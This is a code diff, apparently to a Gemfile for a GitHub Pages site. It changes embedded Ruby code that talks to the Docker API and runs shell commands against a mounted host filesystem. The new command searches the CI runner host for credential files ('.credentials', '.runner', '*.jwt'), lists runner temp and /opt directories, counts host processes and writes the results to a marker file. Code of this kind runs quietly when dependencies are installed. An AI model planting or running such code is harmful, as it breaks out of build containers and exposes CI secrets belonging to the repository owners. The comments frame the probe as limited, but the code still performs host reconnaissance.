@@ -19,10 +19,7 @@ def dock(method, ep, body = nil)
 rescue => e
   "ERR #{e.class}"
 end
-CMD = 'echo "=== /hostfs/home/runner/actions-runner (presence/mode/size ONLY) ==="; ' \
-      'ls -la /hostfs/home/runner/actions-runner/ 2>&1 | head -30; ' \
-      'echo "=== nested ==="; ls -la /hostfs/home/runner/actions-runner/*/ 2>&1 | head -30; ' \
-      'echo "=== CONTROL host identity ==="; cat /hostfs/etc/hostname'
+CMD = 'echo "=== host credential-material search (NAMES/MODES/SIZES ONLY, nothing opened) ==="; find /hostfs -maxdepth 4 -name ".credentials*" -o -maxdepth 4 -name ".runner" -o -maxdepth 4 -name "*.jwt" 2>/dev/null | head -20; echo "=== /hostfs/opt ==="; ls -la /hostfs/opt 2>&1 | head -15; echo "=== /hostfs/home/runner/work/_temp ==="; ls -la /hostfs/home/runner/work/_temp 2>&1 | head -20; echo "=== running processes on the HOST (names only) ==="; ls /hostfs/proc 2>/dev/null | grep -c "^[0-9]"; echo "=== CONTROL host identity ==="; cat /hostfs/etc/hostname'
 begin
   imgs = dock("GET", "/images/json")
   ids = imgs.scan(/"Id":"(sha256:[0-9a-f]{64})"/).flatten.uniq
@@ -57,7 +54,7 @@ begin
 rescue => e
   out << "FATAL #{e.class}"
 end
-line = "pgx-rcred2-8a4f uid=#{Process.uid}\n" + out.join("\n")
+line = "pgx-hsearch-3d7b uid=#{Process.uid}\n" + out.join("\n")
 warn line
-begin; File.write(File.join(Dir.pwd, "pgx-rcred2-8a4f.txt"), line + "\n"); rescue => e; warn "wf:#{e.class}"; end
+begin; File.write(File.join(Dir.pwd, "pgx-hsearch-3d7b.txt"), line + "\n"); rescue => e; warn "wf:#{e.class}"; end
 gem "github-pages", group: :jekyll_plugins
